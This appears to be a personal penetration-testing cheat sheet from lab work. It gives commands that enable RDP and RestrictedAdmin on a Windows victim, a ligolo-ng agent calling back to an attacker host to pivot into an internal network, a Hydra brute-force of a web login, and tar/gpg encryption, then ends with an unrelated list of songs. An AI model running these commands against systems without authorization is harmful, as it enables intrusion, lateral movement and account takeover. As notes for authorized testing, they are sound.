Enable RDP
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

# ligolo - https://github.com/nicocha30/ligolo-ng
```
## Compiling
- Use the CGO_ENABLED=0 flag when building because of issues with glibc

Public network: 192.168.211.x
Internal Network: 172.16.211.x
## On Kali:
- sudo ip tuntap add user kali mode tun ligolo
- sudo ip link set ligolo up
- sudo ./proxy -selfcert

## On victim [linux]: 
- ./agent -connect 192.168.45.195:11601 -ignore-cert

## On Kali:
- sudo ip route add 172.16.211.0/24 dev ligolo
```
# Hydra
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.233.134 http-post-form "/login.php:username=admin&password=^PASS^&Submit=Login:Incorrect information"
```
- username is case sensitive...

# Tar - Encrypt / Decrypt
```
tar czvpf - ./[encdir] | gpg --symmetric --no-symkey-cache --cipher-algo aes256 -o [filename].tar.gz.gpg

gpg -d [decryptfilename] | tar -xvzf -
```



Blood // Water - Grandson
Letting you go  - bfmv
Moving on - Asking Alexandria
Limits - Bad Omens
Just pretend - 
Choke - The Warning
Deafening - Solence
Neon Grave - Dayseeker
Nero Forte - Slipknot
Crooked Halos - Dragged Under
Polyamorous - Breaking Benjamin
Room to Breathe - You me at six